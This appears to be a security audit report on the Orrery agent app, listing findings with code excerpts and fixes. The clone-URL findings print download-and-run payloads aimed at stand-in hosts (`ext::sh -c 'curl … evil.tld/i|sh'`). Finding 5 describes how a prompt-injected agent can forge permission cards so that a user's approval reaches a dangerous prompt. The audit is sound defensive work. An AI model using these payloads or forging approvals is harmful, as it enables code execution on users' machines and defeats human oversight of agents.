# 02 — Security

Audit pass 2, run at v0.22.2 on branch `claude/repository-audit-36c5hc`. Eight security lenses examined the code; every finding was then re-read by a second reviewer whose instructions were to refute it. What survives is below: **9 high, 27 medium, 58 low**, plus one claim rejected on verification and listed at the end so you can see it was considered.

Method and limits, stated plainly. Nothing was executed: the Rust crate cannot be compiled in this container (no webkit2gtk), no exploit was run, and no competitor or live installation was tested. Every finding is derived from reading code, and each carries `path:line`. Dependency advisories come from `pnpm audit` and `cargo audit` run here, then triaged for reachability. Findings are attributed to a threat actor: **T1** a compromised or prompt-injected agent process running as the user, **T2** a malicious repository the user adds as a project, **T3** another local process, **T4** a network attacker, **T5** a compromised upstream package or CI action, **T6** an untrusted visitor of the landing site. Findings that say only "an agent can write to its own worktree" were excluded, because agents run arbitrary code as the user by design; what counts is crossing a boundary the app claims to enforce.

## The short version

**Your release pipeline is the most dangerous thing in this repository, and it is not close.** The minisign private key is the single root of trust for every installed copy of Orrery — the shipped updater validates only that key and a fixed endpoint. That key is currently reachable by: three third-party GitHub Actions pinned to mutable tags and one to a branch (`release.yml:96,106,107`), every `build.rs` of every crate and every npm lifecycle script that runs during `pnpm tauri build` (`release.yml:110-115`), and anyone who can push a `v*` tag, since there is no approval gate. On top of that, `latest.json` is itself unsigned, so an attacker who can serve a modified manifest can force any user down to any previously signed build. If one of those actions is compromised tomorrow, every Orrery installation executes attacker code at its next update check, silently. Fix this before anything else in this file.

**Path handling has a documented guard that several commands simply do not use.** `safe_join` exists and is described in its own module header as making escape impossible (`agents/fs_commands.rs:2-4,16-32`), but it is lexical only — no canonicalisation, so a symlink checked out by a repository walks straight through it. More importantly, a set of commands never call it at all: `agent_conflict_resolve` writes caller-chosen content to a caller-chosen path with automatic parent-directory creation and before any merge-state check, and `file_diff`, `file_hunks`, `revert_hunk` and `working_blame` join unvalidated paths onto the worktree. `agent_dir` and `project_dir` will enumerate any directory on the machine.

**Two paths destroy user data without the opt-in the code documents.** `WorktreeDisposal` exists precisely so a delete "can never cost someone work they had not committed", and `agent_remove` honours it. `remove_for_project` ignores it entirely and `remove_dir_all`s every agent worktree of the project, reached from a single unconfirmed context-menu click. Separately, `remove_worktree` recursively deletes whatever directory a repository's own `.git/worktrees/<name>/gitdir` file names, which a hostile repo controls.

**A pasted URL is code execution.** `project_create` hands `source_url` to system `git clone` with no scheme validation, so an `ext::` URL makes git's remote helper execute a shell command as the user, before any project exists.

**The hook bridge authenticates the connection but not the claimant.** One app-wide token plus a body-supplied `agentId` means any process that can read `ORRERY_TOKEN` from a PTY environment — including an npm postinstall inside a worktree — can raise a permission card attributed to a different agent, with content it chooses, and your Approve click sends real keystrokes into that agent's terminal.

**Windows Defender is permanently disabled for the entire worktree tree**, with no opt-out, no disclosure in the UI, and no removal on uninstall — and the elevated step launches `powershell.exe` by bare name, which resolves against the user-writable install directory before System32.

The dependency picture is comparatively unremarkable: the shipped runtime carries `dompurify` 3.2.7 via Monaco, and the RustSec entries (`quick-xml`, `rkyv`, `crossbeam-epoch`) sit in paths that do not process attacker-controlled input in this app. Most of the 63 advisories are dev-only tooling.

## What is deliberately out of scope

These are documented decisions with rationale, not defects, and no finding below treats them as such: agents execute arbitrary code as the user; hooks are fire-and-forget so allow/deny are best-effort keystrokes; network git operations shell out to system `git` so the OS credential helper handles authentication; the macOS build is knowingly unsigned; this is a private single-author beta.


## High (9)

### 1. Signing job runs three third-party GitHub Actions on mutable refs (v6 / v2 tags, `stable` branch) alongside the Tauri updater private key

`.github/workflows/release.yml:96-115` — supply-chain-cve

**Actor.** T5 (compromised upstream package / action) — secondarily T4 · **Precondition.** Any of pnpm/action-setup, dtolnay/rust-toolchain or swatinem/rust-cache is compromised (maintainer account takeover, or an attacker who can move the v6/v2 tag or push to the `stable` branch). No access to the Orrery repo is required.

**Impact.** The action's code runs in the same job step sequence as TAURI_SIGNING_PRIVATE_KEY / TAURI_SIGNING_PRIVATE_KEY_PASSWORD (release.yml:113-114) and can read them out of the runner (env, or by wrapping the `tauri build` toolchain). With the minisign private key an attacker can sign an arbitrary payload that the shipped updater accepts — tauri.conf.json:47-49 pins only the public key and the endpoint — giving silent code execution on every Orrery installation at next update check. The same job also carries the workflow-level `permissions: contents: write` token (release.yml:31-32).

**How it breaks.** release.yml:96/106/107 resolve `pnpm/action-setup@v6`, `dtolnay/rust-toolchain@stable` and `swatinem/rust-cache@v2` at every run; GitHub re-resolves the tag/branch each time, so whoever controls those repos controls the code executed on the windows-latest and macos-14 runners. Two steps later the job runs `pnpm tauri build` with TAURI_SIGNING_PRIVATE_KEY and TAURI_SIGNING_PRIVATE_KEY_PASSWORD in the step environment (release.yml:112-115); a malicious action reads them from the runner (process env, or by shimming the cargo/tauri toolchain it just installed) and exfiltrates them. With the minisign key the attacker signs an arbitrary payload; the shipped updater accepts it because src-tauri/tauri.conf.json:50 pins only the public key and 47-49 only the endpoint URL. swatinem/rust-cache@v2 additionally persists a build cache that a later release restores, so a poisoned cache is a second route into the signed binary.

  ```
  96	      - uses: pnpm/action-setup@v6
  106	      - uses: dtolnay/rust-toolchain@stable
  107	      - uses: swatinem/rust-cache@v2
  111	      - name: Build Tauri app with signed updater artifacts
  112	        env:
  113	          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
  114	          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
  ```

**Fix.** Pin every non-`actions/*` step to a full 40-char commit SHA with a trailing `# v6.x` comment. Better: move the signing step into a minimal job that runs no third-party actions and consumes a pre-built, unsigned artifact from the build job, and put that job behind a GitHub Environment with required reviewers so the secret is not reachable from an arbitrary push. Add `--locked` to the cargo side of the build, and consider an OIDC-backed signing service instead of a long-lived key in Actions secrets.

<sub>Verifier: Re-read .github/workflows/release.yml. grep -n 'uses:' confirms exactly three non-actions/* third-party steps, all on mutable refs: line 96 'pnpm/action-setup@v6', line 106 'dtolnay/rust-toolchain@stable' (a BRANCH), line 107 'swatinem/rust-cache@v2'. They run in the same `build` job whose next steps are release.yml:110 'pnpm install --frozen-lockfile' and release.yml:111-115, which injects TAURI_SIGNING_PRIVATE_KEY / _PASSWORD into `pnpm tauri build`. Workflow-level 'permissions: contents: write' is at release.yml:31-32 as claimed. No mitigating guard exists: there is no environment-protection rule, no separate signing job, no SHA pin. The updater trusts only the embedded minisign pubkey (src-tauri/tauri.conf.json:50) and the fixed endpoint (47-49), so a stolen private key yields silently accepted updates. Nothing to refute. Only citation nit: pubkey is line 50 and endpoints 47-49, not 47-49/47-48 as written.</sub>

### 2. Removing a project hard-deletes every agent worktree, ignoring the KeepFolder opt-in and with no confirmation

`src-tauri/src/agents/service.rs:514-517` — privilege-elevation

**Actor.** no adversary needed (plain user action) — the app destroys data the opt-in says it will not touch · **Precondition.** The user clicks "Remove project" in the project context menu while the project has agents whose worktrees hold uncommitted work.

**Impact.** Every agent worktree of the project is recursively deleted, including uncommitted/unpushed work, with no `hard` flag, no confirm modal, and no trash/undo step — the exact loss the disposal enum exists to prevent.

**How it breaks.** `WorktreeDisposal` documents KeepFolder as the default "so a delete can never cost someone work they had not committed" and DeleteFolder as "the opt-in hard delete the confirm modal asks for explicitly" (src-tauri/src/git/types.rs:11-14); `agent_remove` honours that, mapping the UI checkbox to a disposal (src-tauri/src/agents/commands.rs:106-110) and routing the delete through the trash/rename path (service.rs:409-424). `remove_for_project` takes no disposal at all and calls `std::fs::remove_dir_all` on every agent's recorded worktree unconditionally. Its only caller is `project_remove` (src-tauri/src/projects/commands.rs:68-95), which the frontend invokes straight from the menu item with no dialog: `{ label: "Remove project", icon: "trash", danger: true, onClick: () => this.removeProject(id) }` (src/app/projects/project-actions.service.ts:145) → `removeProject` → `projectsStore.remove(id)` (project-actions.service.ts:72-78). One menu click erases N worktrees.

  ```
  src-tauri/src/agents/service.rs
  499:    pub fn remove_for_project(&self, project_id: Uuid) -> AppResult<Vec<Uuid>> {
  ...
  514:        // best-effort: drop each agent's worktree working dir
  515:        for r in &recs {
  516:            let _ = std::fs::remove_dir_all(&r.worktree);
  517:        }
  ```

**Fix.** Give `remove_for_project` a `WorktreeDisposal` parameter defaulting to KeepFolder, stop each agent's PTY and watcher first (as `agent_remove` does), route any deletion through `trash_path`/`rename_retry`/`purge_in_background`, and have the frontend ask for the hard-delete opt-in before `project_remove`.

<sub>Verifier: Re-read src-tauri/src/agents/service.rs:499-521: `remove_for_project` takes no `WorktreeDisposal` and does `let _ = std::fs::remove_dir_all(&r.worktree);` for every agent of the project. The opt-in contract is real and documented at src-tauri/src/git/types.rs:8-14 ("a delete can never cost someone work they had not committed"), and `AgentService::remove` (service.rs:400-424) honours it via `trash_path`/`rename_retry`, keyed off the `hard` checkbox in agents/commands.rs:105-110. The only caller is `project_remove` (projects/commands.rs:67-78), and the menu item at src/app/projects/project-actions.service.ts:145 calls `removeProject` -> `projectsStore.remove(id)` (project-actions.service.ts:72-78) with no confirm dialog anywhere in that chain. Two aggravating details the finder missed: (a) unlike `agent_remove`, `project_remove` never calls `rt.stop(id)` / `watch.unwatch(id)` first, although agents/commands.rs:95-97 documents that a live PTY holding its cwd is exactly what makes deletion fail, and the errors are swallowed by `let _`; (b) `remove_worktree` is never called either, so the `.git/worktrees/` registrations leak and a later agent with the same slug hits the "already registered" error at gix_backend.rs:2463-2467. Severity stays high: it crosses the opt-in-deletion boundary the app explicitly claims.</sub>

### 3. The clone URL from Add Project is passed to system `git clone` with no scheme validation, so an `ext::` URL executes a shell command

`src-tauri/src/git/backend.rs:197` — command-execution _(added by verifier)_

**Actor.** an attacker who gets the user to paste a URL (social engineering / a link in an issue, README or chat); no repo access needed · **Precondition.** The user opens Add Project, selects the git source, and pastes an attacker-supplied clone URL such as `ext::sh -c 'curl -sL http://evil.tld/i|sh' /repo`.

**Impact.** Arbitrary command execution as the user at clone time, before any project or agent exists. git's own `protocol.ext` policy is `user` and the app invokes `git clone` directly (GIT_PROTOCOL_FROM_USER unset), so the ext transport is allowed and git runs the embedded command.

**How it breaks.** `clone_repo` builds `git clone [--depth N] <url> <target>` and passes the URL as a bare positional with no `--` terminator and no scheme check (backend.rs:191-198). Nothing upstream validates it: `create_from_git` only rejects an empty string (`if url.is_empty() || base.is_empty()`, projects/service.rs:199-203) and then derives a folder name with `repo_name_from_url` (service.rs:16-20), which is a naive `rsplit(['/',':'])` and happily yields "repo" for `ext::sh -c '...' /repo`; the clone then runs at service.rs:236. The frontend does no validation either - the field is a free-text input bound straight into the request (`sourceUrl: git ? this.url().trim() : undefined`, src/app/modals/add-project-modal.component.ts:393) and `canSubmit` only checks non-emptiness (add-project-modal.component.ts:342-346). This is the realistic-precondition sibling of fs-git-worktree-05: unlike that finding it needs no `.git` directory to be delivered, only a pasted string.

  ```
  src-tauri/src/git/backend.rs
  191:    fn clone_repo(&self, url: &str, target: &Path, depth: Option<u32>) -> AppResult<()> {
  192:        let mut cmd = crate::core::proc::cmd("git");
  193:        cmd.arg("clone");
  ...
  197:        cmd.arg(url).arg(target);
  198:        run_git(cmd, "clone")
  
  src-tauri/src/projects/service.rs
  199:        let url = req.source_url.as_deref().unwrap_or("").trim().to_string();
  201:        if url.is_empty() || base.is_empty() {
  236:        self.git.clone_repo(&url, &target, req.depth)?;
  ```

**Fix.** Validate the URL before shelling out - accept only `https://`, `http://`, `git://`, `ssh://`, `git@host:path` and existing local paths, rejecting anything containing `::` or starting with `-` - and run the clone with hostile-transport defences: `git -c protocol.ext.allow=never -c protocol.allow=user -c core.fsmonitor= clone -- <url> <target>`.

### 4. remove_worktree recursively deletes whatever directory the repo's `.git/worktrees/<name>/gitdir` file names

`src-tauri/src/git/gix_backend.rs:2513-2519` — path-traversal

**Actor.** T2 (a malicious repository the user adds as a project, delivered with its `.git` directory intact — zip/tarball, shared drive, colleague's copy) · **Precondition.** The repo ships `.git/worktrees/<name>/gitdir` containing an arbitrary path; the user spawns an agent whose slug equals `<name>` (attacker can plant hundreds of likely slugs) and later removes that agent with the hard-delete checkbox.

**Impact.** Recursive deletion of an attacker-chosen directory outside the app's worktree root — e.g. `gitdir` = `/home/<user>/Documents/.git` erases `~/Documents`. Errors are swallowed (`let _ =`), so the walk deletes everything it can.

**How it breaks.** The registration file is read from disk and its parent is deleted with no validation that it is under the worktree root or that the app wrote it. The chain works because `create_worktree` refuses a name that is already registered (gix_backend.rs:2463-2468) and `AgentService::spawn` only *logs* that failure while still inserting the DB row (agents/service.rs:210-217, `log::warn!("worktree create failed…")`). So the planted registration survives untouched. On removal the recorded worktree path does not exist, so the trash/rename step is skipped (service.rs:417-423), and `remove_worktree(project, wt_name, DeleteFolder)` is still called (service.rs:428-434) with `wt_name` = the agent's slug. `registration_dir` (gix_backend.rs:344-346) resolves to the attacker's directory, `private.is_dir()` passes, and `remove_dir_all_retry(dir)` runs on the parent of the attacker-supplied path. The same primitive fires accidentally when spawn's registration name and on-disk folder disagree (documented at agents/service.rs:410-415), leaving a stale registration whose `gitdir` points at a folder later reused.

  ```
  src-tauri/src/git/gix_backend.rs
  2509:        let private = registration_dir(&repo, wt_name);
  2510:        if !private.is_dir() { return Ok(()); }
  2513:        if disposal == WorktreeDisposal::DeleteFolder {
  2515:            if let Ok(gitfile) = std::fs::read_to_string(private.join("gitdir")) {
  2516:                if let Some(dir) = Path::new(gitfile.trim()).parent() {
  2517:                    let _ = remove_dir_all_retry(dir);
  ```

**Fix.** Never derive the directory to delete from repo-controlled metadata: delete only the caller's recorded worktree path, and only after checking it is inside the effective worktree root (canonicalize both and compare prefixes); at minimum verify the `gitdir` target contains a `.git` file whose `gitdir:` pointer round-trips back to this registration.

<sub>Verifier: Every link re-verified. gix_backend.rs:2504-2521: `remove_worktree` resolves `registration_dir(&repo, wt_name)` = `<common>/worktrees/<name>` (gix_backend.rs:343-346) and on DeleteFolder reads `private.join("gitdir")` and calls `remove_dir_all_retry(Path::new(gitfile.trim()).parent())` with no check that the target is under the worktree root and no round-trip against the `.git` pointer `create_worktree` writes (gix_backend.rs:2470-2478). Reachability holds: `create_worktree` bails with "already registered" when `private.exists()` (gix_backend.rs:2463-2467) BEFORE creating anything, `spawn` only `log::warn!`s that failure and still inserts the row (agents/service.rs:208-215, 219-233), so the planted registration survives and `rec.worktree` names a directory that does not exist, which makes `remove` skip the trash/rename step (service.rs:409-423) and still call `self.git.remove_worktree(pp, wt_name, disposal)` (service.rs:426-433) with `wt_name` = that folder's basename. Name predictability is real: `worktree_name` (service.rs:47-68) is a pure slug of the user-typed agent name with no uuid unless the name is empty or already used in the project, so common slugs are plantable in bulk. The precondition (repo delivered with `.git` intact + the hard-delete checkbox) keeps it below critical, but arbitrary out-of-root recursive deletion is high.</sub>

### 5. One app-wide bridge token + body-supplied agentId lets any hook client forge permission cards for any agent, and the user's Approve sends real keystrokes into that agent's PTY

`src-tauri/src/hooks/mod.rs:181-277` — authz-access

**Actor.** T1 (a prompt-injected / compromised agent process, or any child it spawns — including T5, an npm postinstall run inside the worktree, which inherits ORRERY_TOKEN from the PTY env) · **Precondition.** The caller holds ORRERY_TOKEN + ORRERY_ENDPOINT. Every agent Orrery launches is given them (agents/adapters/mod.rs:169-177), the SAME token for every agent (hooks/mod.rs:108, agents/commands.rs:349-354), and every process the agent spawns inherits them.

**Impact.** A compromised agent can (a) raise a permission card attributed to ITSELF whose entire visible content (summary/command/description/filePath/questions) it chose, while its terminal actually has a different, dangerous prompt pending, and (b) attribute that card to a DIFFERENT agent's uuid. Clicking Approve on the card calls agent_allow(agentId), which types the tool's real approve keys ("1\r" for Claude) into that agent's PTY. The human-in-the-loop approval — the app's core safety control — is decoupled from what the user was shown, so the user can be induced to approve an arbitrary pending tool call in any agent's terminal.

**How it breaks.** handle() authenticates only the shared token (hooks/mod.rs:181) and then takes the agent identity from the request BODY (protocol.rs:22-24 `agent_id`), passing it straight to emit_permission (hooks/mod.rs:268-275). Nothing binds the connection, the token, or the ORRERY_AGENT_ID env to the agentId in the envelope. A prompt-injected agent runs one benign-looking Bash command that pipes a fabricated payload into `orrery hook --event PermissionRequest` (or curls 127.0.0.1 with its own $ORRERY_TOKEN). agent-runtime.service.ts:584-612 renders the payload's `summary`/`command` as the card text and keeps p.agentId; notification.service.ts:33-35 then calls agentsStore.allow(n.agentId) on Accept, which reaches agent_allow (agents/commands.rs:451-462) and writes adapter.allow_keys() into that agent's PTY. The attacker arranges for a real dangerous prompt (a `rm -rf`, or Claude's "Yes, and don't ask again") to be the thing actually pending when the forged benign card is approved. The documented trade-off covers keystroke delivery being best-effort; it does not cover the card's identity and content being attacker-chosen.

  ```
  181:    if req.auth.as_deref() != Some(token) {   // the ONLY check: one app-wide token
  185:    let env: HookEnvelope = match serde_json::from_str(&req.body) {
  268:            emit_permission(
  269:                emit,
  270:                &env.agent_id,   // agent identity comes from the attacker-controlled BODY
  271:                tool,            // as do tool/summary/command/description/questions
  ```

**Fix.** Mint a per-agent token at launch (map token -> agent uuid in the bridge) and derive agent_id from the authenticated token, rejecting any envelope whose agentId does not match; additionally treat hook-supplied permission text as untrusted display data and require the user to confirm in the agent's own terminal for anything that sends keystrokes.

<sub>Verifier: Re-read every link in the chain and it holds. hooks/mod.rs:181 `if req.auth.as_deref() != Some(token)` is the only authentication, and the identity used for every downstream effect comes from the request body (protocol.rs:23-24 `pub struct HookEnvelope { pub agent_id: String,`), passed unvalidated to emit_permission (hooks/mod.rs:268-271). Nothing anywhere maps a token or connection to an agent uuid: the token is minted once per app run (hooks/mod.rs:110 `let token = uuid::Uuid::new_v4().to_string();`) and the SAME string is stamped on every agent (adapters/mod.rs:172-175, commands.rs:346-354). Frontend side confirmed: agent-runtime.service.ts:584-611 keeps `p.agentId` and renders `p.summary || p.command || …` as the card body with no cross-check that the agent has an actual pending prompt; notification.service.ts:35 `void this.agentsStore.allow(n.agentId)` -> commands.rs:451-461 `rt.write(id, adapter.allow_keys())`. agent_allow performs no 'is a permission actually pending' check — it just types the keys. Two corrections/strengtheners rather than refutations: (a) the attacker does not even need the PermissionRequest event — protocol.rs:288-296 promotes a `Notification` with `notification_type == "permission_prompt"` to a full PermissionRequest, so several event names reach the same emit; (b) the forged card can carry attacker-authored `questions[]`, and question-stepper.component.ts:293/312 calls `agentsStore.decide(id, i+1)` -> commands.rs:487-499 -> `decide_keys(choice)` = `format!("{choice}\r")` (adapters/mod.rs:266-268), so the attacker chooses WHICH digit the user's click types into the victim PTY (e.g. steering the click onto Claude's option 2, 'Yes, and don't ask again'). I checked for a guard and there is none: the suggestions chips are display-only (notification-card.component.ts:71-85, no persist action), which refutes only the extra 'attacker persists an allow rule' escalation, not the finding. Precondition is reachable: with autoApprove 'off' the agent needs one approved/allowlisted shell command (or any child process — an npm postinstall — inheriting ORRERY_TOKEN from runtime/mod.rs:224-226) to POST the forged envelope. High is right: it defeats the human-in-the-loop approval the whole permission-card feature exists to provide, and it crosses into another agent's PTY.</sub>

### 6. agent_conflict_resolve writes caller-controlled content to an unvalidated path before any merge-state or index check (arbitrary file write)

`src-tauri/src/agents/commands.rs:871-890` — path-traversal

**Actor.** T5 (compromised frontend npm package) or any XSS in the webview; the caller of invoke · **Precondition.** One agent (or project) row exists so svc.get(id) resolves; no merge needs to be in progress — conflict_resolve writes the file before it touches the index.

**Impact.** Arbitrary file create/overwrite anywhere the user can write, with fully attacker-chosen content and automatic parent-directory creation: ~/.bashrc, ~/.claude/settings.json, the Windows Startup folder, a .git/hooks script. Persistence and code execution as the user, outside anything the app calls a sandbox.

**How it breaks.** agent_conflict_resolve takes `path: String` straight from the invoke payload and hands it to GitBackend::conflict_resolve, which does `workdir.join(rel)` (gix_backend.rs:1721) with no component check. Rust's Path::join replaces the whole path when `rel` is absolute, so `path = "C:/Users/me/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.bat"` (or `../../../../home/user/.bashrc`) resolves outside the worktree. create_dir_all on the parent is called first (gix_backend.rs:1722-1724), then std::fs::write with the caller's `content`. Only the later index-staging step fails; the write has already landed. The sibling module agents/fs_commands.rs:17-33 implements exactly the guard this path is missing, and search/mod.rs:241-248 applies it too — this command was simply left out.

  ```
  agents/commands.rs:874  path: String,
  agents/commands.rs:881      svc.git().conflict_resolve(
  agents/commands.rs:883          &path,
  git/gix_backend.rs:1721      let abs = workdir.join(rel);
  git/gix_backend.rs:1723          let _ = std::fs::create_dir_all(parent);
  git/gix_backend.rs:1725      std::fs::write(&abs, content)
  ```

**Fix.** Route `path` through agents::fs_commands::safe_join (or a shared guard) before any join in git/gix_backend.rs, and additionally require that a merge session is actually in progress and that `path` is one of the conflicted entries.

<sub>Verifier: Re-read agents/commands.rs:869-889 and git/gix_backend.rs:1716-1740. agent_conflict_resolve takes `path: String` from the payload (commands.rs:874) and passes it straight to conflict_resolve (commands.rs:881-884); GitBackend::conflict_resolve does `let abs = workdir.join(rel);` (gix_backend.rs:1721), `create_dir_all(parent)` (1723) and `std::fs::write(&abs, content)` (1725) with no component check and no merge-state check — all merge-related work (filter pipeline, index staging) happens AFTER the write, so the file lands even when no merge is in progress. `svc.get(id)` also resolves a PROJECT id through project_pseudo_record (agents/service.rs:733), so one project or agent row suffices. Path::join replaces the base on an absolute `rel`; `..` is equally unchecked. The guard exists two files over (agents/fs_commands.rs:16-32) and in search/mod.rs:231-246. Nothing refutes it; strongest write primitive on the invoke surface.</sub>

### 7. project_remove hard-deletes every agent worktree with no opt-in and no confirmation, contradicting agent_remove's documented "deleting uncommitted work is opt-in"

`src-tauri/src/agents/service.rs:516` — destructive-command-without-opt-in _(added by verifier)_

**Actor.** The user themself (one click on the project context menu's "Remove project"); also T5/XSS, which needs only the project id. · **Precondition.** A project with at least one agent whose worktree still holds uncommitted work. No modal, no checkbox, no `hard` parameter exists on this path at all.

**Impact.** Every agent worktree of the project is recursively erased — all uncommitted agent work, plus any untracked files the user kept there — from a single unconfirmed context-menu click. The per-agent path deliberately makes exactly this destructive and calls it out as opt-in; the project path silently does it unconditionally, so the contract the app states does not hold on the surface where the blast radius is largest.

**How it breaks.** project_remove (projects/commands.rs:66-94) takes only `id` — there is no disposal or `hard` argument — and calls agents.remove_for_project(id). That function deletes the rows and then loops `for r in &recs { let _ = std::fs::remove_dir_all(&r.worktree); }` (agents/service.rs:514-517): unconditional recursive delete, errors swallowed, no rename-aside/trash step and no undo, unlike AgentService::remove which only touches the folder when disposal == DeleteFolder (service.rs:407-425). The frontend offers no guard either: projectMenu wires `{ label: "Remove project", danger: true, onClick: () => this.removeProject(id) }` (projects/project-actions.service.ts:145) straight to removeProject, which invokes the command with no confirm modal (project-actions.service.ts:72-79) — compare the agent path, which routes through a confirm modal and an explicit checkbox (agents/agent-actions.service.ts:287-306).

  ```
  agents/service.rs:514        // best-effort: drop each agent's worktree working dir
  agents/service.rs:515        for r in &recs {
  agents/service.rs:516            let _ = std::fs::remove_dir_all(&r.worktree);
  agents/commands.rs:76   /// `hard` is the confirm modal's "also delete the folder" checkbox. Default
  agents/commands.rs:77   /// (false) leaves the directory on disk — deleting someone's uncommitted work
  agents/commands.rs:78   /// is opt-in, never a side effect of removing an agent.
  projects/project-actions.service.ts:72  removeProject(id: string) {
  projects/project-actions.service.ts:76      .remove(id)
  ```

**Fix.** Give project_remove the same disposal contract as agent_remove: default to KeepFolder (deregister the worktrees, leave the files) and require an explicit `hard` flag set by a confirm modal that names how many worktrees and how much uncommitted work will be erased; route the deletion through the same rename-aside + background-purge path (AgentService::remove) so a failure aborts as a unit and a mistake is recoverable from the `.trash-` sibling.

### 8. project_create passes source_url unvalidated to `git clone`, allowing the ext:: transport (command execution)

`src-tauri/src/projects/service.rs:195-232` — injection

**Actor.** T2 (attacker-supplied repository string) — the user pastes a clone URL into Add Project; or any webview-side compromise (T5) · **Precondition.** The user is convinced to paste an attacker-supplied string into the Add-Project 'repository url' field (add-project-modal.component.ts:317,393 sends it verbatim; no scheme check anywhere).

**Impact.** Arbitrary command execution as the user at clone time. `git clone 'ext::sh -c "curl http://evil/x|sh"' <dest>` makes git's ext remote-helper exec the supplied command; git's protocol.allow default of `user` permits ext:: for a directly user-initiated clone.

**How it breaks.** ProjectService::create routes any non-empty source_url to create_from_git, which trims it and passes it to GitService::clone_repo. clone_repo (git/backend.rs:191-198) builds `git clone [--depth N] <url> <target>` with `cmd.arg(url)` and no scheme allowlist. Nothing between the text input and the process boundary inspects the string: repo_name_from_url (projects/service.rs:16-20) only splits on `/` and `:` to derive a folder name, so `ext::sh -c 'payload'` yields a name and the clone proceeds. A url beginning with `--` is also parsed by git as an option rather than a repository.

  ```
  projects/service.rs:196      let url = req.source_url.as_deref().unwrap_or("").trim().to_string();
  projects/service.rs:232      self.git.clone_repo(&url, &target, req.depth)?;
  git/backend.rs:193      cmd.arg("clone");
  git/backend.rs:197      cmd.arg(url).arg(target);
  ```

**Fix.** Reject source_url unless it matches an allowlist of transports (https://, http://, git://, ssh://, file://, scp-style user@host:path); refuse strings containing '::' or starting with '-'. Additionally pass `-c protocol.ext.allow=never` and `--` before the URL in clone_repo (git/backend.rs:191-199).

<sub>Verifier: Re-read projects/service.rs:144-148 (any non-empty trimmed source_url routes to create_from_git), 195-232 (url trimmed → `self.git.clone_repo(&url, &target, req.depth)`; repo_name_from_url at service.rs:15-20 only splits on '/' and ':' so `ext::sh -c '…'` still yields a folder name) and git/backend.rs:191-199: `cmd.arg("clone"); … cmd.arg(url).arg(target);` — no scheme allowlist, no `--`, no protocol.ext override. The frontend sends the field verbatim (modals/add-project-modal.component.ts:393 → projects/project-actions.service.ts:59). Because the clone is directly user-initiated, git's protocol.allow default of "user" permits the ext:: remote helper, which execs the supplied command. Code execution as the user; the precondition (user pastes an attacker-supplied clone string) is exactly what this field invites.</sub>

### 9. The release job that holds TAURI_SIGNING_PRIVATE_KEY runs four third-party actions pinned to mutable tags and one to a branch

`.github/workflows/release.yml:96-115` — supply-chain-cve

**Actor.** T5 · **Precondition.** Compromise (or maintainer-account takeover) of any of pnpm/action-setup, dtolnay/rust-toolchain, swatinem/rust-cache, or the actions/* repos, followed by a force-push of the referenced tag — or, for dtolnay/rust-toolchain@stable, merely a push to that branch, since `stable` is a branch ref that moves on every commit.

**Impact.** Exfiltration of the minisign private key and its password, or silent substitution of the built installer before it is signed and uploaded. That key is the single root of trust for every installed copy of Orrery: its public half is baked into tauri.conf.json:50 and shipped in every client, so a leaked key lets the attacker forge updates that every existing installation accepts and installs silently — the exact 'silent tampering of what the user installs' outcome the whole updater design exists to prevent, and one the app cannot revoke for already-installed users.

**How it breaks.** The `build` job checks out the release SHA and, in the same job and therefore the same runner with the same process environment, sets `TAURI_SIGNING_PRIVATE_KEY` and `TAURI_SIGNING_PRIVATE_KEY_PASSWORD` from secrets (release.yml:112-115) and runs `pnpm tauri build`. Every step in that job shares the workspace and can read the environment of subsequent steps' processes, so any of the actions at release.yml:96 (pnpm/action-setup@v6), :102 (actions/setup-node@v6), :106 (dtolnay/rust-toolchain@stable — a branch, the weakest possible pin), :107 (swatinem/rust-cache@v2) or :135 (actions/upload-artifact@v7) can dump the key or rewrite src-tauri/target/release/bundle/** between the build and the staging copies at release.yml:121-126. The blast radius is amplified by the workflow-level `permissions: contents: write` at release.yml:31-32, which is only needed by the `prepare` job but is inherited by the signing job as well.

  ```
  96:      - uses: pnpm/action-setup@v6
  106:      - uses: dtolnay/rust-toolchain@stable
  107:      - uses: swatinem/rust-cache@v2
  112:        env:
  113:          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
  114:          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
  115:        run: pnpm tauri build
  ```

**Fix.** Pin every `uses:` to a full commit SHA with the tag in a trailing comment, scope `contents: write` to the `prepare` job instead of the workflow, and split signing into a minimal job that consumes the unsigned bundle as an artifact so no third-party action ever shares a runner with the key.

<sub>Verifier: Verified line by line. release.yml:111-115 sets TAURI_SIGNING_PRIVATE_KEY and TAURI_SIGNING_PRIVATE_KEY_PASSWORD in the `build` job and runs `pnpm tauri build` there; the same job runs pnpm/action-setup@v6 (:96), actions/setup-node@v6 (:102), dtolnay/rust-toolchain@stable (:106), swatinem/rust-cache@v2 (:107) and actions/upload-artifact@v7 (:135) — every one a mutable ref, and `@stable` in dtolnay/rust-toolchain is a branch that moves on every commit, the weakest pin available. Workflow-level `permissions: contents: write` at release.yml:31-32 is confirmed and is inherited by this job although only `prepare` needs it. The staging copies at :120-126 run in the same workspace, so a compromised action can rewrite the bundle after signing as well as read the key. The pubkey baked at tauri.conf.json:50 with the endpoint at :48 confirms the blast radius: a leaked private key forges updates every installed client accepts silently, with no revocation path. High stands (exposure of the root signing credential); not critical because it requires a third-party compromise rather than a defect in the app.</sub>


## Medium (27)

### 10. The updater-signing job runs `pnpm install` with npm build scripts explicitly re-enabled, executing four dev-dependency postinstalls next to the minisign key

`.github/workflows/release.yml:110` — supply-chain _(added by verifier)_

**Actor.** T5 (compromised upstream npm package) · **Precondition.** A malicious version of @parcel/watcher, esbuild, lmdb or msgpackr-extract (or of any package whose graph they sit in) is present in pnpm-lock.yaml at the built SHA — i.e. it slipped in during a maintainer's dependency bump. All four are transitive @angular/build dev dependencies, not packages the maintainer chose directly.

**Impact.** Arbitrary code execution on the macOS and Windows release runners in the same job step sequence that holds TAURI_SIGNING_PRIVATE_KEY and TAURI_SIGNING_PRIVATE_KEY_PASSWORD, plus the workflow-level `contents: write` GITHUB_TOKEN. Same end state as dependency-cves-01 — a stolen minisign key means silently accepted updates on every installation — but through an npm postinstall rather than a GitHub Action, so pinning actions to SHAs does not close it.

